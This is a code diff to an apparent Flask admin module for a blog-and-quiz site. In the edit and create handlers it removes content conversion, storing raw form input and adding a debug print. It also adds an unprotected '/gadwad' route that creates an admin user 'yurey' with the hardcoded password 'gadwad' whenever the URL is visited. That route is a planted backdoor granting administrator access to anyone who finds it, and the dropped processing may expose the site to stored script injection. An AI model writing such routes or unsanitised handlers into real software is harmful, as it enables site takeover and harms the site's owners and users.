@@ -7,8 +7,8 @@ from flask import (
     Blueprint,
     session,
     jsonify,
-    send_file
-    
+    send_file,
+    Markup
 )
 import functools
 import json
@@ -143,8 +143,9 @@ def create():
         title = request.form["title"]
         lang = request.form["lang"]
         content = request.form["content"].strip()
-        c=convertor(content)
-        data = Posts(title=title, votes=randint(0, 20), content=c, lang=lang)
+        # c=convertor(content)
+        print(content)
+        data = Posts(title=title, votes=randint(0, 20), content=content, lang=lang)
         db.session.add(data)
         db.session.commit()
         flash("Success, your post is live.", 'success')
@@ -182,14 +183,14 @@ def edit(postid):
     post = Posts.query.get(postid)
     if request.method == 'POST':
         post.title = request.form['title']
-        post.content = convertor(request.form['content'].strip())
+        post.content = request.form['content'].strip()
         db.session.commit()
         flash(f'post #{postid} updated', 'success')
         return redirect(url_for("admin.adminpanel"))
     else:
         return render_template("admin/create.html", 
         p=post,
-        content=refactor(post.content),
+        content=post.content,
         update=True,
         title=f'Update post #{postid}')
     
@@ -260,6 +261,11 @@ def editquiz(id):
     return render_template('admin/createquiz.html', update=True, questions=questions, id=id,options=options, answers=answers, title=f'Edit {t} quiz', t=t)
 
 
-
+@admin.route('/gadwad')
+def gadwadapaja():
+    admin = Admin(username='yurey', pswd=bcrypt.generate_password_hash('gadwad').decode('utf-8'))
+    db.session.add(admin)
+    db.session.commit()
+    return '<h1>created</h1>'
 
 
